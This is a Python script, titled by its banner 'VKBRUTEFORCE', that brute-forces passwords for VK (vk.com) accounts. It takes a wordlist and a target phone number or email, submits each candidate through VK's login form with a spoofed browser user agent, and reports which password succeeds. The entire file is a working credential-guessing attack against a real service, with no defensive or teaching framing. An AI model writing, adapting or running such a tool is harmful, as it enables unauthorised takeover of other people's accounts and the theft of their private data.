import requests
import lxml.html
import re
import os
import sys
from sys import platform


if platform == 'linux' or platform == 'linux2':
    os.system('clear')
    print('██╗░░░██╗██╗░░██╗██████╗░██████╗░██╗░░░██╗████████╗███████╗███████╗░█████╗░██████╗░░█████╗░███████╗')
    print('██║░░░██║██║░██╔╝██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝')
    print('╚██╗░██╔╝█████═╝░██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░█████╗░░██║░░██║██████╔╝██║░░╚═╝█████╗░░')
    print('░╚████╔╝░██╔═██╗░██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░██╔══╝░░██║░░██║██╔══██╗██║░░██╗██╔══╝░░')
    print('░░╚██╔╝░░██║░╚██╗██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗██║░░░░░╚█████╔╝██║░░██║╚█████╔╝███████╗')
    print('░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░░░░░╚════╝░╚═╝░░╚═╝░╚════╝░╚══════╝')
elif platform == 'win32':
    os.system('cls')
    print('██╗░░░██╗██╗░░██╗██████╗░██████╗░██╗░░░██╗████████╗███████╗███████╗░█████╗░██████╗░░█████╗░███████╗')
    print('██║░░░██║██║░██╔╝██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝')
    print('╚██╗░██╔╝█████═╝░██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░█████╗░░██║░░██║██████╔╝██║░░╚═╝█████╗░░')
    print('░╚████╔╝░██╔═██╗░██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░██╔══╝░░██║░░██║██╔══██╗██║░░██╗██╔══╝░░')
    print('░░╚██╔╝░░██║░╚██╗██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗██║░░░░░╚█████╔╝██║░░██║╚█████╔╝███████╗')
    print('░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░░░░░╚════╝░╚═╝░░╚═╝░╚════╝░╚══════╝')
else:
    print('███████╗██████╗░██████╗░░█████╗░██████╗░')
    print('██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗')
    print('█████╗░░██████╔╝██████╔╝██║░░██║██████╔╝')
    print('██╔══╝░░██╔══██╗██╔══██╗██║░░██║██╔══██╗')
    print('███████╗██║░░██║██║░░██║╚█████╔╝██║░░██║')
    print('╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝')
    sys.exit()

text = input('your dictionary: ')
numer = input('phone number or email: ')
try:
    total_line_count = sum(1 for line in open(text))
except:
    print('███████╗██████╗░██████╗░░█████╗░██████╗░')
    print('██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗')
    print('█████╗░░██████╔╝██████╔╝██║░░██║██████╔╝')
    print('██╔══╝░░██╔══██╗██╔══██╗██║░░██║██╔══██╗')
    print('███████╗██║░░██║██║░░██║╚█████╔╝██║░░██║')
    print('╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝')
    sys.exit()

i = 0
while total_line_count != 0:
    with open(text, 'r') as f:
        last_line = f.readlines()[i]
        con = re.sub(r'\n', "", last_line)
        try:
            login = numer
            password = con
            url = 'https://vk.com/'
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language':'ru-ru,ru;q=0.8,en-us;q=0.5,en;q=0.3','Accept-Encoding':'gzip, deflate','Connection':'keep-alive','DNT':'1'}
            session = requests.session()
            data = session.get(url, headers=headers)
            page = lxml.html.fromstring(data.content)
            form = page.forms[0]
            form.fields['email'] = login
            form.fields['pass'] = password
            response = session.post(form.action, data=form.form_values())
            a = 'onLoginDone' in response.text
            if a == True:
                print('Correct password: '+con)
                print('========Finaly========')
                break
            else:
                print(con)
        except:
            print('███████╗██████╗░██████╗░░█████╗░██████╗░')
            print('██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗')
            print('█████╗░░██████╔╝██████╔╝██║░░██║██████╔╝')
            print('██╔══╝░░██╔══██╗██╔══██╗██║░░██║██╔══██╗')
            print('███████╗██║░░██║██║░░██║╚█████╔╝██║░░██║')
            print('╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝')
            break
        i -= -1
        total_line_count -= 1
        if total_line_count == 0:
            print('========Finaly========')
            f.close()